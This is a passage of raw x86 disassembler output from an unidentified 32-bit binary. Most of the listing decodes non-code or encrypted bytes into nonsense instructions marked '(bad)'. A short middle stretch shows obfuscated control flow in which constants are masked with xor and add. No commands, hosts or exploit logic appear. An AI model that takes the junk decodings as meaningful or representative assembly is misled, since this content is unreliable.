  40ff81:	ja     0x40ff13
  40ff83:	mov    WORD PTR [ebp+0x718a2166],?
  40ff89:	adc    esi,edi
  40ff8b:	xor    dh,cl
  40ff8d:	(bad)  
  40ff8e:	jmp    DWORD PTR [ecx+ebx*1+0x26]
  40ff92:	jmp    0x809c:0xf18e9678
  40ff99:	jg     0x40ff8b
  40ff9b:	cmpxchg BYTE PTR [edi+0x5686abc1],dl
  40ffa2:	pop    edx
  40ffa3:	jmp    DWORD PTR [ebp+0x50]
  40ffa6:	leave  
  40ffa7:	or     eax,0x2a08851e
  40ffac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ffad:	lock xchg ecx,eax
  40ffaf:	xchg   ebp,eax
  40ffb0:	push   esp
  40ffb1:	mov    DWORD PTR [esi],esp
  40ffb3:	jp     0x41002d
  40ffb5:	add    al,0x83
  40ffb7:	sub    eax,0x168b5dda
  40ffbc:	outs   dx,BYTE PTR ds:[esi]
  40ffbd:	and    eax,0x83d0c3d6
  40ffc2:	xlat   BYTE PTR ds:[ebx]
  40ffc3:	sar    DWORD PTR [ebp+0x17],1
  40ffc6:	inc    ebp
  40ffc7:	bswap  eax
  40ffc9:	ror    BYTE PTR [ebx],0xbc
  40ffcc:	stos   BYTE PTR es:[edi],al
  40ffcd:	icebp  
  40ffce:	and    al,0x43
  40ffd0:	pusha  
  40ffd1:	test   BYTE PTR ds:0x33d6fbda,dl
  40ffd7:	test   eax,0xcb95b698
  40ffdc:	mov    ds:0x33a8cc5c,eax
  40ffe1:	inc    esp
  40ffe2:	sub    eax,0xc772d6c4
  40ffe7:	fidiv  DWORD PTR [esi-0x66]
  40ffea:	stos   BYTE PTR es:[edi],al
  40ffeb:	in     al,0xe8
  40ffed:	xor    al,0x65
  40ffef:	pop    ss
  40fff0:	or     BYTE PTR cs:[edx+0xf6005bc],ah
  40fff7:	xchg   DWORD PTR [edi],edx
  40fff9:	mov    esp,0xa0b09b7e
  40fffe:	(bad)  
  40ffff:	out    dx,al
  410000:	call   0x8827:0x320e96f7
  410007:	xchg   edx,eax
  410008:	(bad)  [esi+edx*1-0x61]
  41000c:	dec    eax
  41000d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41000e:	mov    esp,0x9804f890
  410013:	jp     0x41003a
  410015:	ret    
  410016:	leave  
  410017:	jge    0x40ffbd
  410019:	stos   DWORD PTR es:[edi],eax
  41001a:	dec    ebp
  41001b:	and    dh,BYTE PTR [edi+0x63]
  41001e:	int3   
  41001f:	or     edi,ecx
  410021:	mov    esp,ebp
  410023:	dec    eax
  410024:	xor    BYTE PTR [edx],0x6f
  410027:	pop    ss
  410028:	loopne 0x410033
  41002a:	(bad)  
  41002b:	ror    BYTE PTR [ebx],1
  41002d:	aas    
  41002e:	xor    BYTE PTR [edx+0x56],ch
  410031:	bound  esi,QWORD PTR [edi+0x36051030]
  410037:	mov    cl,0x1a
  410039:	and    al,0x23
  41003b:	cwde   
  41003c:	mov    cl,0x92
  41003e:	call   0xeb55305b
  410043:	popa   
  410044:	xor    al,0x54
  410046:	lea    esi,[ebp+eiz*8+0x9a11cb1]
  41004d:	pop    ebp
  41004e:	imul   edx,eax,0xeb03506d
  410054:	mov    ds:0xae1a5790,al
  410059:	xor    eax,0xd0094132
  41005e:	mov    fs,WORD PTR [edx-0x3c]
  410061:	sbb    al,0x39
  410063:	les    ecx,FWORD PTR [ebp+0x19]
  410066:	test   eax,0x94a5ef66
  41006b:	mov    cl,0xf1
  41006d:	retf   0xb860
  410070:	jmp    0x30a7:0xf699ccc6
  410077:	pop    ds
  410078:	call   0x5674:0x94ed8e11
  41007f:	sub    edx,DWORD PTR [esi+0x42]
  410082:	fisubr DWORD PTR [ebx-0x7db5f04d]
  410088:	xchg   esi,eax
  410089:	test   DWORD PTR [eax],ebx
  41008b:	sub    eax,DWORD PTR [ebx]
  41008d:	sub    eax,0x473fb181
  410092:	jbe    0x4100cc
  410094:	pop    ecx
  410095:	gs aad 0x62
  410098:	scas   al,BYTE PTR es:[edi]
  410099:	int3   
  41009a:	fist   DWORD PTR [ebx]
  41009c:	jo     0x41004d
  41009e:	adc    eax,0x54f5bf36
  4100a3:	or     ah,BYTE PTR [edi-0x2a]
  4100a6:	cmp    DWORD PTR [ebx],0x2067c45b
  4100ac:	jl     0x41011b
  4100ae:	xor    BYTE PTR [ebx-0x6c15e5b4],ah
  4100b4:	fdivr  QWORD PTR [ecx-0x54aa19d7]
  4100ba:	gs cmp al,0x67
  4100bd:	mov    eax,ds:0x9aa59245
  4100c2:	jne    0x410139
  4100c4:	pusha  
  4100c5:	rol    BYTE PTR [esi-0x2b],0xd3
  4100c9:	push   esi
  4100ca:	das    
  4100cb:	ret    
  4100cc:	xchg   edx,eax
  4100cd:	sti    
  4100ce:	stos   DWORD PTR es:[edi],eax
  4100cf:	push   ecx
  4100d0:	dec    ebp
  4100d1:	test   al,0x26
  4100d3:	or     al,ah
  4100d5:	shl    ebp,1
  4100d7:	(bad)  
  4100d8:	add    BYTE PTR [edi-0x2d],0xc4
  4100dc:	fld    QWORD PTR [edi+0x7e274233]
  4100e2:	cs pop edi
  4100e4:	pop    eax
  4100e5:	mov    al,0x92
  4100e7:	out    dx,al
  4100e8:	mov    ds:0x9ca7205a,al
  4100ed:	mov    edi,0x13287ff8
  4100f2:	mov    ecx,0x154ac6d
  4100f7:	dec    esp
  4100f8:	loopne 0x4100f5
  4100fa:	sub    dl,BYTE PTR [ecx+0x5e]
  4100fd:	mov    edx,0xb97e4d75
  410102:	xor    eax,0xc60e8bc9
  410107:	cwde   
  410108:	xchg   edx,eax
  410109:	inc    ebx
  41010a:	jmp    0x410094
  41010c:	jl     0x410100
  41010e:	sub    DWORD PTR [ecx+ebp*8],0x6ba0b3f7
  410115:	aas    
  410116:	pop    ds
  410117:	scas   eax,DWORD PTR es:[edi]
  410118:	fcomp  DWORD PTR [ecx-0x6e847637]
  41011e:	hlt    
  41011f:	xor    DWORD PTR [esi],eax
  410121:	ins    DWORD PTR es:[edi],dx
  410122:	push   cs
  410123:	ds and al,0x82
  410126:	sahf   
  410127:	jmp    0x4100e5
  410129:	ja     0x410130
  41012b:	outs   dx,DWORD PTR ds:[esi]
  41012c:	lods   eax,DWORD PTR ds:[esi]
  41012d:	inc    ebx
  41012e:	xchg   ebp,eax
  41012f:	dec    ebx
  410130:	fild   DWORD PTR [esi-0xb3a0b16]
  410136:	and    cl,cl
  410138:	cs scas al,BYTE PTR es:[edi]
  41013a:	jb     0x4100f8
  41013c:	aas    
  41013d:	and    esi,ecx
  41013f:	jnp    0x4100dd
  410141:	cmp    DWORD PTR [ebp+eiz*2+0x1b],ecx
  410145:	retf   
  410146:	hlt    
  410147:	not    BYTE PTR [esi+0x7f]
  41014a:	mov    dl,0x22
  41014c:	pop    ss
  41014d:	outs   dx,DWORD PTR ds:[esi]
  41014e:	out    dx,eax
  41014f:	push   DWORD PTR [ecx]
  410151:	push   ebx
  410152:	fdivrp st(6),st
  410154:	xchg   ecx,eax
  410155:	stc    
  410156:	enter  0xdfe4,0x7c
  41015a:	popa   
  41015b:	xchg   DWORD PTR [ebx],edi
  41015d:	pop    ds
  41015e:	add    esp,DWORD PTR [edi-0x5ff3e43b]
  410164:	aad    0x9c
  410166:	push   ss
  410167:	shl    BYTE PTR [ebx],cl
  410169:	cli    
  41016a:	sub    BYTE PTR ds:0x5c482a9d,0x8e
  410171:	cli    
  410172:	xor    eax,0xe6bece27
  410177:	rcl    esi,cl
  410179:	mov    DWORD PTR [eax+0x35],0x5e66adbf
  410180:	stc    
  410181:	push   cs
  410182:	test   al,0x56
  410184:	push   ebx
  410185:	fcos   
  410187:	call   0x59f949ab
  41018c:	pop    ecx
  41018d:	xor    edx,DWORD PTR [eax]
  41018f:	or     al,0x50
  410191:	push   eax
  410192:	outs   dx,BYTE PTR ds:[esi]
  410193:	iret   
  410194:	adc    DWORD PTR [eax-0x4b120678],ebx
  41019a:	lock ror BYTE PTR [edi-0x4729474a],1
  4101a1:	loop   0x4101f9
  4101a3:	mov    ch,0x2f
  4101a5:	jae    0x410144
  4101a7:	pop    edx
  4101a8:	js     0x4101c2
  4101aa:	adc    al,0x3e
  4101ac:	or     BYTE PTR [ebx-0x7e],dh
  4101af:	jg     0x41021a
  4101b1:	scas   eax,DWORD PTR es:[edi]
  4101b2:	test   al,0x9f
  4101b4:	cmp    ecx,DWORD PTR [esi-0x59f10a6a]
  4101ba:	bound  edx,QWORD PTR [ebx+0x77]
  4101bd:	add    esi,DWORD PTR [edx]
  4101bf:	test   al,0x72
  4101c1:	adc    BYTE PTR [ecx+0x5ea3c2cb],bh
  4101c7:	bound  edi,QWORD PTR [ecx]
  4101c9:	mov    al,ds:0x3b45ba22
  4101ce:	sbb    ah,al
  4101d0:	adc    ebx,DWORD PTR [ebp+eiz*1+0x65babb71]
  4101d7:	ror    DWORD PTR [edi],1
  4101d9:	ss gs and dl,bh
  4101dd:	lock pop ebp
  4101df:	mov    eax,ds:0x9b178981
  4101e4:	xor    DWORD PTR [edx],ebp
  4101e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4101e7:	xchg   esp,eax
  4101e8:	lods   al,BYTE PTR ds:[esi]
  4101e9:	ins    BYTE PTR es:[edi],dx
  4101ea:	in     al,dx
  4101eb:	jne    0x410258
  4101ed:	rcr    DWORD PTR [ecx-0x5ba0f3cd],0x6d
  4101f4:	in     eax,dx
  4101f5:	shl    BYTE PTR [eax-0x63],cl
  4101f8:	and    al,BYTE PTR [edi-0x21]
  4101fb:	or     ecx,DWORD PTR [eax+edx*1]
  4101fe:	dec    edi
  410200:	push   cs
  410201:	and    ch,BYTE PTR [ecx]
  410203:	mov    edx,0xf633e77e
  410208:	and    eax,DWORD PTR [edx+ebx*1-0x5cfa8adb]
  41020f:	inc    ecx
  410210:	mov    cl,dh
  410212:	aam    0x22
  410214:	push   es
  410215:	mov    ds:0xda580acc,al
  41021a:	pop    ebx
  41021b:	pop    ss
  41021c:	sub    BYTE PTR [edx-0x53a03dbb],bl
  410222:	mov    esi,0x380f227c
  410227:	popf   
  410228:	mov    dl,0x75
  41022a:	je     0x4101d6
  41022c:	mov    bh,0x4a
  41022e:	scas   al,BYTE PTR es:[edi]
  41022f:	aaa    
  410230:	push   ebx
  410231:	or     edx,DWORD PTR [eax-0x11]
  410234:	nop
  410235:	dec    esi
  410236:	dec    eax
  410237:	mov    edx,DWORD PTR [edi+0x26]
  41023a:	xlat   BYTE PTR ds:[ebx]
  41023b:	push   ss
  41023c:	add    eax,edi
  41023e:	imul   eax,ebx
  410241:	cmp    eax,edx
  410243:	ja     0x4191d2
  410249:	mov    edx,DWORD PTR [ebp-0x10]
  41024c:	mov    eax,DWORD PTR [ebp-0x14]
  41024f:	mov    ebx,DWORD PTR [ebp-0x28]
  410252:	sub    eax,edx
  410254:	xor    ebx,esi
  410256:	xor    edx,edx
  410258:	add    ebx,edi
  41025a:	div    ebx
  41025c:	mov    DWORD PTR [ebp-0x8],eax
  41025f:	mov    eax,DWORD PTR [ebp-0x2c]
  410262:	mov    edx,DWORD PTR [ebp-0x8]
  410265:	xor    eax,esi
  410267:	add    eax,edi
  410269:	cmp    edx,eax
  41026b:	jbe    0x41027b
  410271:	mov    eax,DWORD PTR [ebp-0x2c]
  410274:	xor    eax,esi
  410276:	add    eax,edi
  410278:	mov    DWORD PTR [ebp-0x8],eax
  41027b:	mov    eax,DWORD PTR [ebp-0x28]
  41027e:	mov    edx,DWORD PTR [ebp-0x8]
  410281:	xor    eax,esi
  410283:	add    eax,edi
  410285:	imul   eax,edx
  410288:	mov    DWORD PTR [ebp-0x8],eax
  41028b:	mov    eax,DWORD PTR [ebp-0x3c]
  41028e:	mov    edx,DWORD PTR [ebp-0x8]
  410291:	xor    eax,esi
  410293:	add    eax,edi
  410295:	cmp    edx,eax
  410297:	je     0x4191bb
  41029d:	mov    eax,DWORD PTR [ebp-0x8]
  4102a0:	mov    DWORD PTR [ebp-0x20],eax
  4102a3:	mov    eax,DWORD PTR [ebp-0x10]
  4102a6:	add    eax,DWORD PTR [ebp-0x40]
  4102a9:	mov    DWORD PTR [ebp-0x24],0xf89c85b6
  4102b0:	mov    DWORD PTR [ebp-0x8],eax
  4102b3:	mov    eax,0xf89c85b5
  4102b8:	mov    DWORD PTR [ebp-0x1c],eax
  4102bb:	mov    DWORD PTR [ebp-0x38],0xf89c85b4
  4102c2:	mov    DWORD PTR [ebp-0x30],eax
  4102c5:	mov    eax,DWORD PTR [ebp-0x24]
  4102c8:	xor    eax,esi
  4102ca:	add    eax,edi
  4102cc:	jmp    0x416dfa
  4102d1:	mov    DWORD PTR [ebp-0x48],0xf89c85be
  4102d8:	mov    DWORD PTR [ebp-0x4c],0xf89c85a1
  4102df:	mov    eax,DWORD PTR [ebp-0x30]
  4102e2:	mov    edx,DWORD PTR [ebp-0xc]
  4102e5:	xor    eax,esi
  4102e7:	add    eax,edi
  4102e9:	imul   eax,edx
  4102ec:	mov    edx,DWORD PTR [ebp-0x1c]
  4102ef:	xor    edx,esi
  4102f1:	add    eax,edx
  4102f3:	mov    edx,DWORD PTR [ebp-0x8]
  4102f6:	mov    al,BYTE PTR [eax+edx*1+0x3272db]
  4102fd:	mov    BYTE PTR [ebp-0x1],al
  410300:	mov    eax,DWORD PTR [ebp-0x1c]
  410303:	mov    edx,DWORD PTR [ebp-0x1c]
  410306:	xor    eax,esi
  410308:	xor    edx,esi
  41030a:	lea    ebx,[eax+edx*1+0x64e5b6]
  410311:	mov    eax,DWORD PTR [ebp-0xc]
  410314:	xor    edx,edx
  410316:	div    ebx
  410318:	mov    eax,DWORD PTR [ebp-0x1c]
  41031b:	xor    eax,esi
  41031d:	add    eax,edi
  41031f:	cmp    edx,eax
  410321:	mov    eax,DWORD PTR [ebp-0x30]
  410324:	mov    edx,DWORD PTR [ebp-0xc]
  410327:	jmp    0x41269c
  41032c:	lods   al,BYTE PTR ds:[esi]
  41032d:	jbe    0x410322
  41032f:	loop   0x4102d4
  410331:	jmp    DWORD PTR [ebx-0x2d50dedc]
  410337:	into   
  410338:	xor    BYTE PTR [ecx],cl
  41033a:	enter  0xbfee,0x8e
  41033e:	bound  esp,QWORD PTR [edx+0xa]
  410341:	pop    edi
  410342:	bound  esp,QWORD PTR [edx+0x5]
  410345:	leave  
  410346:	mov    edx,0x659974a7
  41034b:	mov    eax,ds:0xec8e16f2
  410350:	adc    DWORD PTR [edi],edx
  410352:	shr    BYTE PTR [ebp+0x2d],cl
  410355:	sbb    al,0xd0
  410357:	fistp  WORD PTR [ecx-0x76]
  41035a:	mov    esi,0x6e4bdbbc
  41035f:	mov    WORD PTR [edx],fs
  410361:	in     eax,dx
  410362:	daa    
  410363:	daa    
  410364:	push   edi
  410365:	cmc    
  410366:	repz repnz adc DWORD PTR [ebx],edx
  41036a:	adc    esp,DWORD PTR [edi-0x91d5ac8]
  410370:	dec    ebx
  410371:	jge    0x4103ab
  410373:	imul   BYTE PTR [ebx]
  410375:	mov    ch,0xb7
  410377:	scas   eax,DWORD PTR es:[edi]
  410378:	es in  eax,dx
  41037a:	repnz mov esp,0x48b26a00
  410380:	mov    WORD PTR [edi],ds
  410382:	sti    
  410383:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410384:	and    edx,DWORD PTR [edi-0x21]
  410387:	inc    ecx
  410388:	adc    eax,ebp
  41038a:	ins    DWORD PTR es:[edi],dx
  41038b:	outs   dx,BYTE PTR ds:[esi]
  41038c:	push   ebp
  41038d:	mov    ah,0xf4
  41038f:	lea    ebp,[ecx+edx*4+0x13]
  410393:	push   eax
  410394:	cmp    bh,dh
  410396:	add    BYTE PTR fs:[ebp-0xa],0x60
  41039b:	fwait
  41039c:	mov    edi,0x17eed910
  4103a1:	adc    eax,0x3a0e4c1b
  4103a6:	pushf  
  4103a7:	call   0xa4f3ba40
  4103ac:	jae    0x4103e7
  4103ae:	out    dx,al
  4103af:	test   eax,0x9b1ba19c
  4103b4:	push   0x6
  4103b6:	mov    edi,0x4ea0b0a2
  4103bb:	sbb    DWORD PTR [edi+ecx*1],edx
  4103be:	pop    edi
  4103bf:	mov    esi,0x9d9f7c61
  4103c4:	adc    al,0x84
  4103c6:	xchg   ebp,eax
  4103c7:	daa    
  4103c8:	aad    0x8c
  4103ca:	push   ds
  4103cb:	jmp    0xfac8894e
  4103d0:	sbb    dh,BYTE PTR [edi]
  4103d2:	xor    dh,BYTE PTR [eax-0x75]
  4103d5:	sbb    al,0x18
  4103d7:	add    DWORD PTR [eax+0x4fa6b6c],ebx
  4103dd:	mov    bl,0xb3
  4103df:	aaa    
  4103e0:	stos   DWORD PTR es:[edi],eax
  4103e1:	xor    ebp,ebx
  4103e3:	add    BYTE PTR [ebp-0x1e],ah
  4103e6:	fcom   DWORD PTR [esi+0x3fb85430]
  4103ec:	ins    DWORD PTR es:[edi],dx
  4103ed:	xor    DWORD PTR [ebx],esp
  4103ef:	cli    
  4103f0:	push   esp
  4103f1:	jne    0x410452
  4103f3:	mov    ds:0x1072f6e0,eax
  4103f8:	(bad)  
  4103f9:	loopne 0x41038a
  4103fb:	lods   eax,DWORD PTR ds:[esi]
  4103fc:	push   edx
  4103fd:	mov    DWORD PTR [edi-0x4b1a542b],edi
  410403:	jne    0x410460
  410405:	jo     0x410387
  410407:	sbb    bl,ah
  410409:	rcl    dl,1
  41040b:	mov    eax,ds:0x9f740162
  410410:	or     BYTE PTR [esi+edi*4],0x7d
  410414:	or     eax,0xa12dbc1
  410419:	mov    esp,0xa680fb1b
  41041e:	mov    cl,0xb4
  410420:	mov    esi,0x43162de
  410425:	and    al,0x70
  410427:	call   0xee4f88dc
  41042c:	fadd   st(4),st
  41042e:	push   cs
  41042f:	stc    
  410430:	mov    ecx,0x7bf326c3
  410435:	test   esi,ecx
  410437:	(bad)  
  410438:	push   esi
  410439:	xchg   edx,eax
  41043a:	add    DWORD PTR [edi+ebx*1-0x37724478],esp
  410441:	js     0x4103fe
  410443:	cmp    esp,DWORD PTR [edx+edx*1-0x70]
  410447:	mov    ebx,0x251a5ebc
  41044c:	and    al,ch
  41044e:	pushf  
  41044f:	add    BYTE PTR ds:0xef38557a,ch
  410455:	call   0xbde9eed7
  41045a:	jp     0x4104a9
  41045c:	idiv   DWORD PTR [ebx]
  41045e:	or     al,0x4f
  410460:	pop    esp
  410461:	out    dx,eax
  410462:	sti    
  410463:	inc    edx
  410464:	int3   
  410465:	les    edx,FWORD PTR [eax+0xe94ccde]
  41046b:	mov    esp,0x3cefe9bf
  410470:	dec    ecx
  410471:	pop    esp
  410472:	cmp    al,0x5a
  410474:	mov    eax,ds:0xbf7ec7be
  410479:	aaa    
  41047a:	sub    eax,0x3e6d2dbb
  41047f:	test   BYTE PTR [edi-0x28],bl
  410482:	fldenv [ebx+0x571c9dd6]
  410488:	(bad)  
  410489:	daa    
  41048a:	ins    DWORD PTR es:[edi],dx
  41048b:	jg     0x4104d0
  41048d:	dec    esi
  41048e:	jb     0x410473
  410490:	(bad)  
  410491:	in     eax,dx
  410492:	or     ch,BYTE PTR ds:0x32db7b88
  410498:	jl     0x410424
  41049a:	aam    0x2d
  41049c:	dec    esp
  41049d:	push   cs
  41049e:	xchg   esi,eax
  41049f:	arpl   ax,bx
  4104a1:	mov    ds:0xb62846cd,al
  4104a6:	push   edi
  4104a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4104a8:	dec    esp
  4104a9:	cmp    dh,ch
  4104ab:	popa   
  4104ac:	mov    esi,0xeac5d0c7
  4104b1:	pop    ecx
  4104b2:	mov    esi,0x363680d0
  4104b7:	xchg   ecx,eax
  4104b8:	sub    ah,BYTE PTR [eax-0xa]
  4104bb:	push   eax
  4104bc:	xchg   ebp,eax
  4104bd:	fcmovnb st,st(3)
  4104bf:	popf   
  4104c0:	and    BYTE PTR [ecx-0x31],bh
  4104c3:	add    al,cl
  4104c5:	and    bl,BYTE PTR es:[edi]
  4104c8:	imul   eax,DWORD PTR [esi-0x7b59bbb2],0x7d37fcf6
  4104d2:	int3   
  4104d3:	mov    edi,0x21fb26f5
  4104d8:	and    dl,al
  4104da:	pop    DWORD PTR [edx+edi*1+0x294651c]
  4104e1:	push   0x8247a4e4
  4104e6:	adc    edx,eax
  4104e8:	arpl   di,cx
  4104ea:	sbb    dh,BYTE PTR [ecx]
  4104ec:	test   al,0xfc
  4104ee:	loopne 0x410526
  4104f0:	xor    ecx,ecx
  4104f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4104f3:	in     eax,0x4a
  4104f5:	inc    esi
  4104f6:	jnp    0x410508
  4104f8:	add    eax,0x18fdc6d9
  4104fd:	push   ecx
  4104fe:	and    DWORD PTR [esi+0x4040ab6b],esi
  410504:	pop    es
  410505:	jg     0x41054b
  410507:	scas   eax,DWORD PTR es:[edi]
  410508:	adc    eax,0x79915d8e
  41050d:	das    
  41050e:	add    esi,0xffffffaf
  410511:	shl    BYTE PTR [edx],1
  410513:	sar    BYTE PTR ds:0xafb2df8e,cl
  410519:	xchg   esp,eax
  41051a:	frstor [ebx-0x2]
  41051d:	mov    es,WORD PTR [eax+0x1c0a442a]
  410523:	xchg   ebx,eax
  410524:	add    DWORD PTR [ebp+edi*8-0x6c5b7ab7],0x6ba3cccb
  41052f:	dec    esp
  410530:	push   edx
  410531:	das    
  410532:	nop    DWORD PTR [edi+0x52f39839]
  410539:	test   eax,0x924c3498
  41053e:	pop    es
  41053f:	lds    ebp,FWORD PTR [ecx-0x568bc05f]
  410545:	cmp    ah,bh
  410547:	push   ss
  410548:	or     al,0x85
  41054a:	inc    esi
  41054b:	and    dl,BYTE PTR [ebx-0x71196673]
  410551:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410552:	fdiv   DWORD PTR ds:0x6f0a3fac
  410558:	jge    0x4105a3
  41055a:	es push es
  41055c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41055d:	dec    ecx
  41055e:	leave  
  41055f:	imul   BYTE PTR [ecx-0x4abc9795]
  410565:	push   0x47
  410567:	or     DWORD PTR [ebx+0x6738c428],ecx
  41056d:	fstp   DWORD PTR [esi+0x18]
  410570:	push   0x430c6203
  410575:	fcmovbe st,st(4)
  410577:	pop    eax
  410578:	cmp    bh,BYTE PTR [edi+eiz*8-0x57]
  41057c:	cld    
  41057d:	jge    0x410542
  41057f:	pop    ecx
  410580:	mov    ebx,0xc0d3b1ea
  410585:	sbb    eax,0xddcd4e7a
  41058a:	imul   esi,ecx,0xffffff93
  41058d:	or     DWORD PTR [edx+ecx*8],edi
  410590:	pop    eax
  410591:	hlt    
  410592:	and    DWORD PTR [edi-0x49395d10],0xcbcb5fe4
  41059c:	call   FWORD PTR [ecx+edx*4+0x51]
  4105a0:	jo     0x410524
  4105a2:	push   edi
  4105a3:	inc    ecx
  4105a4:	cmp    eax,0x829660a4
  4105a9:	and    BYTE PTR [edi+0x30d21d4d],ch
  4105af:	inc    edx
  4105b0:	sub    edi,ecx
  4105b2:	lods   al,BYTE PTR ds:[si]
  4105b4:	lahf   
  4105b5:	pop    esi
  4105b6:	cld    
  4105b7:	arpl   WORD PTR [eax+0x24],si
  4105ba:	adc    ecx,DWORD PTR [edi+ecx*2-0x7839240e]
  4105c1:	pop    ds
  4105c2:	ds inc edi
  4105c4:	add    eax,0x185c7661
  4105c9:	jge    0x4105f1
  4105cb:	ror    ebx,cl
  4105cd:	adc    al,0x9f
  4105cf:	sbb    al,0x40
  4105d1:	sub    edi,DWORD PTR [ebp+0x386dd660]
  4105d7:	mov    ebp,0x61529974
  4105dc:	xchg   edx,eax
  4105dd:	test   BYTE PTR [eax],cl
  4105df:	repnz cmp eax,0xf096382d
  4105e5:	xchg   ebp,eax
  4105e6:	pop    ds
  4105e7:	das    
  4105e8:	fs cmp al,0xda
  4105eb:	addr16 dec ecx
  4105ed:	inc    ecx
  4105ee:	loope  0x410639
  4105f0:	(bad)
  4105f4:	or     ebp,0x356cae94
  4105fa:	fwait
  4105fb:	and    DWORD PTR [esi+eiz*8+0x2c8b5980],ecx
  410602:	rcr    DWORD PTR [ebp-0x6d],cl
  410605:	xchg   edi,eax
  410606:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410607:	add    DWORD PTR [ebp-0x3f87dde0],edx
  41060d:	adc    dh,BYTE PTR [esp+edi*8+0x1ecc6965]
  410614:	lahf   
  410615:	lahf   
  410616:	cs pop eax
  410618:	ja     0x41066b
  41061a:	outs   dx,DWORD PTR ds:[esi]
  41061b:	xor    al,0xf5
  41061d:	repnz sub DWORD PTR ds:0x979c444d,ecx
  410624:	scas   al,BYTE PTR es:[edi]
  410625:	out    0x8e,al
  410627:	into   
  410628:	sti    
  410629:	jnp    0x4105b6
  41062b:	adc    ecx,DWORD PTR [edi]
  41062d:	lock mov cl,0x2b
  410630:	jecxz  0x41069c
  410632:	repnz scas eax,DWORD PTR es:[edi]
  410634:	jecxz  0x4105bc
  410636:	not    BYTE PTR ds:0x804bfade
  41063c:	jno    0x410655
  41063e:	xor    eax,esi
  410640:	(bad)  
  410642:	cmc    
  410643:	out    0x73,al
  410645:	test   BYTE PTR [esi+0x5ee4e1d8],dl
  41064b:	add    BYTE PTR ds:0x30d68141,0x49
  410652:	jle    0x41063c
  410654:	push   0x19e6bb04
  410659:	(bad)  
  41065a:	jecxz  0x41069d
  41065c:	cdq    
  41065d:	mov    ch,0x26
  41065f:	adc    ebp,eax
  410661:	add    edx,DWORD PTR [ebx+esi*1+0x60b496f8]
  410668:	pop    edx
  410669:	shl    BYTE PTR [esi+0x1d],1
  41066c:	and    al,0x47
  41066e:	popf   
  41066f:	cmp    DWORD PTR [esp+ecx*8],ebp
  410672:	jle    0x41067a
  410674:	adc    eax,DWORD PTR [ecx+edi*1+0x42e3f75b]
  41067b:	or     al,0x2f
  41067d:	cdq    
  41067e:	sub    BYTE PTR [edi+edi*4-0x43b2d490],dl
  410685:	addr16 shr dh,1
  410688:	mov    ah,0x86
  41068a:	sbb    al,0x16
  41068c:	xlat   BYTE PTR ds:[ebx]
  41068d:	(bad)  [edi-0x60a8f126]
  410693:	les    ecx,FWORD PTR [edi-0x9540a24]
  410699:	add    al,0x7
  41069b:	and    al,0x4e
  41069d:	xchg   edx,eax
  41069e:	mov    cl,0xf1
  4106a0:	sbb    dh,cl
  4106a2:	sar    ch,1
  4106a4:	add    eax,0xf696eafb
  4106a9:	aam    0x1c
  4106ab:	mov    ds:0xa91a7c48,al
  4106b0:	pop    esp
  4106b1:	cwde   
  4106b2:	dec    ebx
  4106b3:	sbb    esi,edx
  4106b5:	jp     0x4106bd
  4106b7:	int    0x74
  4106b9:	dec    esi
  4106ba:	jp     0x4106fe
  4106bc:	int3   
  4106bd:	push   ebx
  4106be:	mov    edi,0x42409984
  4106c3:	add    cl,0xe9
  4106c6:	adc    ch,BYTE PTR [ebp-0x3cfed3f0]
  4106cc:	mov    edi,DWORD PTR [ebp-0x4c627069]
  4106d2:	les    ax,DWORD PTR [ecx+0x5d7bdf69]
  4106d9:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  4106db:	mov    esp,0xd7f4f190
  4106e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4106e1:	and    bl,al
  4106e3:	rol    cl,cl
  4106e5:	aad    0xfa
  4106e7:	mov    cl,0x27
  4106e9:	jae    0x410738
  4106eb:	pop    esp
  4106ec:	retf   
  4106ed:	(bad)  
  4106ee:	in     al,dx
  4106ef:	pop    edx
  4106f0:	lods   eax,DWORD PTR ds:[esi]
  4106f1:	push   cs
  4106f2:	mov    esi,0xdd7d7ffd
  4106f7:	xor    dh,BYTE PTR [edx-0x7e]
  4106fa:	sub    ah,BYTE PTR [ecx+0x25b38b0f]
  410700:	sub    al,0xe
  410702:	sahf   
  410703:	sbb    eax,0xe7e8179
  410708:	aad    0xb
  41070a:	ja     0x41068d
  41070c:	ret    
  41070d:	dec    edi
  41070e:	inc    eax
  41070f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410710:	or     ecx,DWORD PTR [ebp-0x54]
  410713:	push   ss
  410714:	fwait
  410715:	(bad)  
  410716:	cmp    eax,0x7eef55c0
  41071b:	sub    al,0xc8
  41071d:	adc    al,0xf7
  41071f:	out    dx,al
  410720:	xor    edi,ebx
  410722:	popf   
  410723:	call   0x988446e9
  410728:	push   edi
  410729:	dec    esp
  41072a:	inc    esp
  41072b:	bound  ebp,QWORD PTR [esi]
  41072d:	outs   dx,BYTE PTR ds:[esi]
  41072e:	inc    ebp
  41072f:	pop    esp
  410730:	jmp    0x410794
  410732:	(bad)  
  410734:	fcmovne st,st(6)
  410736:	out    dx,al
  410737:	xlat   BYTE PTR ds:[ebx]
  410738:	fwait
  410739:	lock and BYTE PTR [edi-0x78e5ec58],bl
  410740:	xchg   esi,eax
  410741:	fcom   QWORD PTR [ebx]
  410743:	ret    0x2519
  410746:	gs shl al,1
  410749:	jae    0x4106d5
  41074b:	call   0xaf2a:0xcb2d9855
  410752:	ins    DWORD PTR es:[edi],dx
  410753:	xor    al,0x90
  410755:	loopne 0x410779
  410757:	stos   BYTE PTR es:[edi],al
  410758:	stc    
  410759:	push   ebx
  41075a:	inc    esi
  41075b:	stc    
  41075c:	call   0xe781c32e
  410761:	imul   ebp,DWORD PTR [edx],0x56
  410764:	lds    ecx,FWORD PTR [ecx+edx*2]
  410767:	aad    0xb0
  410769:	ds cmp bh,dh
  41076c:	cmc    
  41076d:	mov    esp,0xe4cb3948
  410772:	add    DWORD PTR [esi],ebx
  410774:	lock xor dh,BYTE PTR [esi]
  410777:	mov    ds:0x8e02870b,eax
  41077c:	cs dec eax
